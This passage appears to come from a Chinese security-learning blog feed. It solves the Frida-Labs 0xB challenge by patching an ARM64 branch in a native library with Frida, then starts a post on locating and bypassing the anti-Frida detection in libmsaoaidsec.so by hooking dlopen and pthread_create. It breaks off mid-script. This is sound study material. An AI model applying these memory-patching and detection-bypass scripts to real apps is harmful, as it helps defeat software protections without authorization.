class="line">.text:<span class="number">0000000000015280</span>                 LDR             X8, [SP,#<span class="number">0x50</span>+var_40]</span><br><span class="line">.text:<span class="number">0000000000015284</span>                 ADD             X0, X8, #<span class="number">1</span> ; <span class="type">unsigned</span> __int64</span><br><span class="line">.text:<span class="number">0000000000015288</span>                 BL              ._Znam  ; operator new[](ulong)</span><br><span class="line">.text:<span class="number">000000000001528</span>C                 STR             X0, [SP,#<span class="number">0x50</span>+var_48]</span><br><span class="line">.text:<span class="number">0000000000015290</span>                 STR             XZR, [SP,#<span class="number">0x50</span>+var_30]</span><br><span class="line">.text:<span class="number">0000000000015294</span>                 B               loc_15298</span><br></pre></td></tr></table></figure><p>这是一个关键跳转</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000015248</span>                 B.NE            loc_1532C</span><br><span class="line">.text:<span class="number">000000000001524</span>C                 B               loc_15250</span><br></pre></td></tr></table></figure><p>loc_1532c会直接跳到末尾结束函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000001532</span>C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000001532</span>C</span><br><span class="line">.text:<span class="number">000000000001532</span>C loc_1532C                               ; CODE XREF: Java_com_ad2001_frida0xb_MainActivity_getFlag+<span class="number">28</span>↑j</span><br><span class="line">.text:<span class="number">000000000001532</span>C                                         ; Java_com_ad2001_frida0xb_MainActivity_getFlag:loc_15328↑j</span><br><span class="line">.text:<span class="number">000000000001532</span>C                 LDP             X29, X30, [SP,#<span class="number">0x50</span>+var_s0]</span><br><span class="line">.text:<span class="number">0000000000015330</span>                 ADD             SP, SP, #<span class="number">0x60</span> ; <span class="string">&#x27;`&#x27;</span></span><br><span class="line">.text:<span class="number">0000000000015334</span>                 RET</span><br><span class="line">.text:<span class="number">0000000000015334</span> ; &#125; <span class="comment">// starts at 15220</span></span><br><span class="line">.text:<span class="number">0000000000015334</span> ; End of function Java_com_ad2001_frida0xb_MainActivity_getFlag</span><br><span class="line">.text:<span class="number">0000000000015334</span></span><br></pre></td></tr></table></figure><p>而loc_15250会执行一段解密逻辑并正常走完函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000015250</span> loc_15250                               ; CODE XREF: Java_com_ad2001_frida0xb_MainActivity_getFlag+<span class="number">2</span>C↑j</span><br><span class="line">.text:<span class="number">0000000000015250</span>                 STR             XZR, [SP,#<span class="number">0x50</span>+var_30]</span><br><span class="line">.text:<span class="number">0000000000015254</span>                 ADRL            X8, aJEhmwbmxezisdm ; <span class="string">&quot;j~ehmWbmxezisdmogi~Q&quot;</span></span><br><span class="line">.text:<span class="number">000000000001525</span>C                 STR             X8, [SP,#<span class="number">0x50</span>+var_38]</span><br><span class="line">.text:<span class="number">0000000000015260</span>                 LDR             X8, [SP,#<span class="number">0x50</span>+var_38]</span><br><span class="line">.text:<span class="number">0000000000015264</span>                 STUR            X8, [X29,#var_8]</span><br><span class="line">.text:<span class="number">0000000000015268</span>                 MOV             X8, #<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">.text:<span class="number">000000000001526</span>C                 STUR            X8, [X29,#var_10]</span><br><span class="line">.text:<span class="number">0000000000015270</span>                 LDUR            X0, [X29,#var_8] ; <span class="type">char</span> *</span><br><span class="line">.text:<span class="number">0000000000015274</span>                 LDUR            X1, [X29,#var_10] ; <span class="type">size_t</span></span><br><span class="line">.text:<span class="number">0000000000015278</span>                 BL              .__strlen_chk</span><br><span class="line">.text:<span class="number">000000000001527</span>C                 STR             X0, [SP,#<span class="number">0x50</span>+var_40]</span><br><span class="line">.text:<span class="number">0000000000015280</span>                 LDR             X8, [SP,#<span class="number">0x50</span>+var_40]</span><br><span class="line">.text:<span class="number">0000000000015284</span>                 ADD             X0, X8, #<span class="number">1</span> ; <span class="type">unsigned</span> __int64</span><br><span class="line">.text:<span class="number">0000000000015288</span>                 BL              ._Znam  ; operator new[](ulong)</span><br><span class="line">.text:<span class="number">000000000001528</span>C                 STR             X0, [SP,#<span class="number">0x50</span>+var_48]</span><br><span class="line">.text:<span class="number">0000000000015290</span>                 STR             XZR, [SP,#<span class="number">0x50</span>+var_30]</span><br><span class="line">.text:<span class="number">0000000000015294</span>                 B               loc_15298</span><br><span class="line">.text:<span class="number">0000000000015298</span> ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>那么现在的解题思路就是：<br>1.nop掉<code>.text:0000000000015248                 B.NE            loc_1532C</code><br>2.将它替换成<code>.text:000000000001524C                 B               loc_15250</code></p><p>B.NE代表Branch if Not Equal，也就是当两个操作数不相等时才会跳转<br>B代表跳转</p><p>修改内存:<a class="link"   href="https://learnfrida.info/advanced_usage/#patching-memory" >https://learnfrida.info/advanced_usage/#patching-memory<i class="fas fa-external-link-alt"></i></a><br>patchcode<br><code>Memory.patchCode</code> API 允许我们修改 <code>X</code> 地址处的 <code>N</code> 个字节，该地址以 <code>NativePointer</code> 的形式给出，此指针必须是可写的，以便我们对其进行修改。在某些系统（如 iOS）中，地址指针在映射到内存之前会写入临时位置。因此，代码编写者的第一个参数应该是 <code>code</code> 参数，而不是 <code>openPtr</code>）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Memory</span>.<span class="title function_">patchCode</span>(openPtr, <span class="title class_">Process</span>.<span class="property">pageSize</span>, <span class="keyword">function</span> (<span class="params">code</span>) &#123;</span><br><span class="line"><span class="keyword">const</span> cw = <span class="keyword">new</span> <span class="title function_">X86Writer</span>(code, &#123; <span class="attr">pc</span>: openPtr &#125;);</span><br><span class="line">cw.<span class="title function_">putNopPadding</span>(<span class="title class_">Process</span>.<span class="property">pageSize</span>);</span><br><span class="line">cw.<span class="title function_">putRet</span>();</span><br><span class="line">cw.<span class="title function_">flush</span>();</span><br><span class="line">&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这里是X86Writer,不同的架构要使用不同的方法，我的手机是Arm架构，在这里我用的是Arm64Writer<br>可以查看api:<a class="link"   href="https://frida.re/docs/javascript-api/#x86writer" >https://frida.re/docs/javascript-api/#x86writer<i class="fas fa-external-link-alt"></i></a></p><p>实际操作如下<br>按照之前的方法找到<code>loc_1532C</code>地址，然后进行patch</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> libbase = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> jmp = libbase.<span class="title function_">add</span>(<span class="number">0x15248</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Memory</span>.<span class="title function_">patchCode</span>(jmp, <span class="number">4</span>, <span class="keyword">function</span> (<span class="params">code</span>) &#123;</span><br><span class="line"><span class="keyword">const</span> cw = <span class="keyword">new</span> <span class="title class_">Arm64Writer</span>(code, &#123; <span class="attr">pc</span>: jmp &#125;);</span><br><span class="line">cw.<span class="title function_">putNop</span>(); <span class="comment">//进行nop替换</span></span><br><span class="line">cw.<span class="title function_">flush</span>();</span><br><span class="line">&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>另一个模板</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> writer = <span class="keyword">new</span> <span class="title function_">X86Writer</span>(&lt;address_of_the_instruction&gt;);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="comment">// Insert instructions</span></span><br><span class="line">  <span class="comment">// Flush the changes to memory</span></span><br><span class="line">  writer.<span class="title function_">flush</span>();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">  <span class="comment">// Dispose of the X86Writer to free up resources</span></span><br><span class="line">  writer.<span class="title function_">dispose</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于flush():<br>调用 <code>flush</code> 方法将更改应用于内存。这可确保将修改后的指令写入内存位置。</p><p><code>finally</code> 块用于确保 <code>X86Writer</code> 资源得到正确清理。调用 <code>dispose</code> 方法释放 <code>X86Writer</code> 实例关联的资源。<br>此模板是x86,因此如果我要用在我自己的手机上我需要对其进行更改</p><p>现在来看方法二，替换指令</p><ul><li><code>putBImm(target)</code>: put a B instruction<br>2.将它替换成<code>.text:000000000001524C                 B               loc_15250</code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> libbase = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> jmp = libbase.<span class="title function_">add</span>(<span class="number">0x15248</span>);</span><br><span class="line"><span class="keyword">var</span> target = libbase.<span class="title function_">add</span>(<span class="number">0x1524c</span>);</span><br><span class="line"><span class="title class_">Memory</span>.<span class="title function_">patchCode</span>(jmp, <span class="number">4</span>, <span class="keyword">function</span> (<span class="params">code</span>) &#123;</span><br><span class="line"><span class="keyword">const</span> cw = <span class="keyword">new</span> <span class="title class_">Arm64Writer</span>(code, &#123; <span class="attr">pc</span>: jmp &#125;);</span><br><span class="line"><span class="comment">//cw.putNop();</span></span><br><span class="line">cw.<span class="title function_">putBImm</span>(target);</span><br><span class="line">cw.<span class="title function_">flush</span>();</span><br><span class="line">&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li></ul><p>另一种写法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> adr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x15248</span>);  <span class="comment">// Addres of the b.ne instruction</span></span><br><span class="line"><span class="title class_">Memory</span>.<span class="title function_">protect</span>(adr, <span class="number">0x1000</span>, <span class="string">&quot;rwx&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> writer = <span class="keyword">new</span> <span class="title class_">Arm64Writer</span>(adr);  <span class="comment">// ARM64 writer object</span></span><br><span class="line"><span class="keyword">var</span> target = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x1524c</span>);  <span class="comment">// Address of the next instruction  b  LAB_00115250</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">putBImm</span>(target);   <span class="comment">// Inserts the &lt;b target&gt; instruction in the place of b.ne instruction</span></span><br><span class="line">  writer.<span class="title function_">flush</span>();</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Branch instruction inserted at <span class="subst">$&#123;adr&#125;</span>`</span>);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">dispose</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="修改内存权限"><a href="#修改内存权限" class="headerlink" title="修改内存权限"></a>修改内存权限</h3><p>“此指针必须是可写的”<br>所以如果该页权限受限就可能无法正常patch,这个时候就需要进行权限修改<br><code>Memory.protect</code> 函数的语法为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Memory</span>.<span class="title function_">protect</span>(address, size, protection);</span><br></pre></td></tr></table></figure><p><code>address</code>：用于更改保护的内存区域的起始地址。<br><code>size</code>：内存区域的大小（以字节为单位）。<br><code>protection</code>：内存区域的保护属性。</p><p>通常需要指定一个页的大小</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Memory</span>.<span class="title function_">protect</span>(jnz, <span class="number">0x1000</span>, <span class="string">&quot;rwx&quot;</span>);</span><br></pre></td></tr></table></figure><p>这句单独写在外面，这个是x86的利用脚本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jnz = <span class="title class_">Module</span>.<span class="title function_">getBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x20e2a</span> - <span class="number">0x00010000</span>);</span><br><span class="line"><span class="title class_">Memory</span>.<span class="title function_">protect</span>(jnz, <span class="number">0x1000</span>, <span class="string">&quot;rwx&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> writer = <span class="keyword">new</span> <span class="title function_">X86Writer</span>(jnz);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">flush</span>();</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">dispose</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字节对齐"><a href="#字节对齐" class="headerlink" title="字节对齐"></a>字节对齐</h3><p>ARM64的nop是4字节，x86的nop是一字节</p><ul><li><p><strong>ARM64 (A64 指令集):</strong></p><ul><li><strong>架构类型:</strong> RISC (精简指令集计算) 风格。虽然现代 ARM 很复杂，但 A64 保留了 RISC 的一些关键特性。</li><li><strong>指令长度:</strong> **固定长度 (Fixed-Length)**。所有 A64 指令都是 <strong>4 字节 (32位)</strong> 长。</li><li><strong>对齐要求:</strong> 指令<strong>必须</strong>存储在 4 字节对齐的地址上。CPU 总是从 4 字节对齐的地址开始，一次读取 4 个字节作为一条指令进行解码。</li></ul></li><li><p><strong>x86 &#x2F; x86-64:</strong></p><ul><li><strong>架构类型:</strong> CISC (复杂指令集计算) 风格。</li><li><strong>指令长度:</strong> **可变长度 (Variable-Length)**。x86 指令的长度可以从 <strong>1 字节到 15 字节</strong>不等。指令的第一个字节（或几个字节）通常包含操作码 (Opcode)，后续字节可能包含操作数、寻址模式信息或前缀等。</li><li><strong>对齐要求:</strong> 指令可以从<strong>任何字节地址</strong>开始。虽然处理器为了性能也喜欢对齐的指令（特别是跳转目标），但硬件设计必须能够处理从任意字节边界开始的指令。</li></ul></li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://github.com/DERE-ad2001/Frida-Labs/" >https://github.com/DERE-ad2001/Frida-Labs/<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://learnfrida.info/advanced_usage/" >https://learnfrida.info/advanced_usage/<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://codeshare.frida.re/" >https://codeshare.frida.re/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x1-同一个类中的静态方法&quot;&gt;&lt;a href=&quot;#0x1-同一个类中的静态方法&quot; class=&quot;headerlink&quot; title=&quot;0x1 同一个类中的静态方法&quot;&gt;&lt;/a&gt;0x1 同一个类中的静态方法&lt;/h2&gt;&lt;p&gt;分析&lt;br&gt;基本结构如下&lt;/p&gt;
&lt;figu</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>frida绕过检测学习</title>
    <link href="http://arch3rn4r.github.io/2025/03/02/frida%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B%E5%AD%A6%E4%B9%A0/"/>
    <id>http://arch3rn4r.github.io/2025/03/02/frida%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-03-02T05:53:54.000Z</published>
    <updated>2025-05-02T02:41:58.763Z</updated>
    
    <content type="html"><![CDATA[<h2 id="检测点"><a href="#检测点" class="headerlink" title="检测点"></a>检测点</h2><p>检测Frida的机制一般在Native层实现，通常会创建几个线程轮询检测。</p><h3 id="查看检测的so"><a href="#查看检测的so" class="headerlink" title="查看检测的so"></a>查看检测的so</h3><p>先检查检测部分的代码在哪里</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>),  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;  </span><br><span class="line">            <span class="keyword">var</span> pathptr = args[<span class="number">0</span>];  </span><br><span class="line">            <span class="keyword">if</span> (pathptr !== <span class="literal">undefined</span> &amp;&amp; pathptr != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="keyword">var</span> path = <span class="title function_">ptr</span>(pathptr).<span class="title function_">readCString</span>();  </span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;load &quot;</span> + path);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>然后运行，查看在哪里停止加载<br>现在得到了它检测的so文件<br><code>libmsaoaidsec.so</code></p><h4 id="脚本执行方法"><a href="#脚本执行方法" class="headerlink" title="脚本执行方法"></a>脚本执行方法</h4><p>这里尝试使用了两种方法来执行frida脚本</p><ul><li><strong>Attach 模式</strong>：适合调试已经运行的应用，但可能错过应用启动阶段的重要代码。</li><li><strong>Spawn 模式</strong>：通过启动新进程并提前注入脚本，确保捕获从启动开始的所有行为，适合需要早期 Hook 的情况。<br><strong>Attach</strong><br><code>frida -U &quot;进程名“ -l 脚本文件</code>  失败了<br><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250228170243.png"                                        ></li></ul><p><strong>Spawn</strong><br><code>frida -U -f 包名 -l 脚本名称</code>  成功了</p><p><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250228170145.png"                                        ></p><h4 id="so的加载流程"><a href="#so的加载流程" class="headerlink" title="so的加载流程"></a>so的加载流程</h4><p><code>dlopen</code>用来打开一个动态链接库，将其装入内存</p><p>dlopen内存装载，loadlibrary加载调用<br>在高版本Android，dlopen改成<code>android_dlopen_ext</code></p><p>linker会先对so进行加载与链接，然后调用so的.init_proc函数，接着调用.init_array中的函数，最后才是JNI_OnLoad函数。</p><p><strong>检测具体加载点</strong><br>使用frida hook JNI_OnLoad函数，如果调用了该函数就输出一行日志，如果没有日志输出，那么就说明检测点在.init_xxx函数中，注入的时机可以选择dlopen加载libmsaoaidsec.so完成之后。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlopen</span>(<span class="params">soName = <span class="string">&#x27;&#x27;</span></span>) &#123;  </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>),  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;  </span><br><span class="line">                <span class="keyword">var</span> pathptr = args[<span class="number">0</span>];  </span><br><span class="line">                <span class="keyword">if</span> (pathptr !== <span class="literal">undefined</span> &amp;&amp; pathptr != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    <span class="keyword">var</span> path = <span class="title function_">ptr</span>(pathptr).<span class="title function_">readCString</span>();  </span><br><span class="line">                    <span class="keyword">if</span> (path.<span class="title function_">indexOf</span>(soName) &gt;= <span class="number">0</span>) &#123;  </span><br><span class="line">                        <span class="variable language_">this</span>.<span class="property">is_can_hook</span> = <span class="literal">true</span>;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;,  </span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;  </span><br><span class="line">                <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">is_can_hook</span>) &#123;  </span><br><span class="line">                    <span class="title function_">hook_JNI_OnLoad</span>()  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    );  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_JNI_OnLoad</span>(<span class="params"></span>)&#123;  </span><br><span class="line">    <span class="keyword">let</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libmsaoaidsec.so&quot;</span>)  </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="variable language_">module</span>.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0xC6DC</span> + <span class="number">1</span>), &#123;  </span><br><span class="line">        <span class="title function_">onEnter</span>(<span class="params">args</span>)&#123;  </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;call JNI_OnLoad&quot;</span>)  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="title function_">setImmediate</span>(hook_dlopen, <span class="string">&quot;libmsaoaidsec.so&quot;</span>)</span><br></pre></td></tr></table></figure><p>直接结束了<br><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250302101945.png"                                        ><br>说明关键检测点在.init_proc 或.init_array函数里</p><p>但是dlopen函数调用完之后.init_xxxx函数已经执行完了，这个时候不容易使用frida进行hook<br>hook linker的call_function并不容易，这里面涉及到linker的自举。所以这里有一个新的思路：<em>在.init_proc函数中找一个调用了外部函数的位置，时机越早越好</em></p><h3 id="pthread-create"><a href="#pthread-create" class="headerlink" title="pthread_create"></a>pthread_create</h3><p><code>pthread_create</code> 是 POSIX 线程库中的函数，用于创建新线程。许多应用程序利用它来实现反调试或反 Frida 检测，例如通过线程检查进程内存或状态，检测 Frida 的存在。<br>应用程序的反 Frida 保护通常会通过 pthread_create 创建守护线程，周期性地扫描内存（如 &#x2F;proc&#x2F;self&#x2F;maps）或检查特定字符串（如“frida”），以检测 Frida 的注入。</p><p>那么先查找<br>没有直接出现pthread_create<img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250302115411.png"                                        ><br>尝试<em>hook</em> </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> interceptor = <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;pthread_create&quot;</span>),  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;  </span><br><span class="line">            <span class="keyword">var</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">findModuleByAddress</span>(<span class="title function_">ptr</span>(<span class="variable language_">this</span>.<span class="property">returnAddress</span>))  </span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">module</span> != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[pthread_create] called from&quot;</span>, <span class="variable language_">module</span>.<span class="property">name</span>)  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[pthread_create] called from&quot;</span>, <span class="title function_">ptr</span>(<span class="variable language_">this</span>.<span class="property">returnAddress</span>))  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;,  </span><br><span class="line">    &#125;  </span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>检测到了<code>libmsaoaidsec.so</code>对pthread_create的使用<br><img                         lazyload                       alt="image"                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250302105929.png"                                        ></p><h4 id="查看检测的线程——查找偏移"><a href="#查看检测的线程——查找偏移" class="headerlink" title="查看检测的线程——查找偏移"></a>查看检测的线程——查找偏移</h4><p>Hook <code>pthread_create</code> 函数，记录调用该函数创建线程的模块信息（模块名、线程函数偏移量、参数）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check_pthread_create</span>(<span class="params">name = <span class="literal">null</span></span>) &#123;  </span><br><span class="line">    <span class="keyword">var</span> pthread_create_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&#x27;pthread_create&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> pthread_create = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(pthread_create_addr, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);  </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title 